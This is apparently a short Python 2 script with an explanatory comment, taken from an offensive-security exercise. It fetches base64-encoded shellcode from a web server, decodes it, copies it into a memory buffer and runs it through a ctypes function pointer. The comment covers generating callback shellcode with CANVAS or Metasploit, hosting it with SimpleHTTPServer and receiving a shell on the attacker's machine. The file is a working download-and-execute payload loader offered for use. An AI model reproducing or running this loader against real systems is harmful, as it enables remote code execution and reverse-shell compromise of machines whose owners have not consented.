'''
@@paranoid0x0x
'''

import urllib2
import ctypes
import base64
# retrieve the shellcode from our web server
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)
# decode the shellcode from base64
shellcode = base64.b64decode(response.read())
# create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
# create a function pointer to our shellcode
''' The ctypes cast function allows us to cast the buffer to act like a function pointer  
so that we can call our shellcode like we would call any normal Python function'''
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
# call our shellcode which execute our shell code
shellcode_func()

'''
You can handcode some shellcode or use your favorite pentesting framework
like CANVAS or Metasploit to generate it for you. I picked some 
Windows x86 callback shellcode for CANVAS in my case. Store the raw 
shellcode (not the string buffer!) in /tmp/shellcode.raw on your Linux 
machine and run the following:
  justin$ base64 -i shellcode.raw > shellcode.bin
  justin$ python -m SimpleHTTPServer
      Serving HTTP on 0.0.0.0 port 8000 ...

We simply base64-encoded the shellcode using the standard Linux 
command line. The next little trick uses the SimpleHTTPServer module to 
treat your current working directory (in our case, /tmp/) as its web root. 
Any requests for files will be served automatically for you. Now drop your 
shell_exec.py script in your Windows VM and execute it. You should see the 
following in your Linux terminal:

  192.168.112.130 - - [12/Jan/2020 21:36:30] "GET /shellcode.bin HTTP/1.1" 200 
  
This indicates that your script has retrieved the shellcode from the 
simple web server that you set up using the SimpleHTTPServer module. If all 
goes well, youâ€™ll receive a shell back to your framework, and have popped 
calc.exe, or displayed a message box or whatever your shellcode was compiled for.
'''
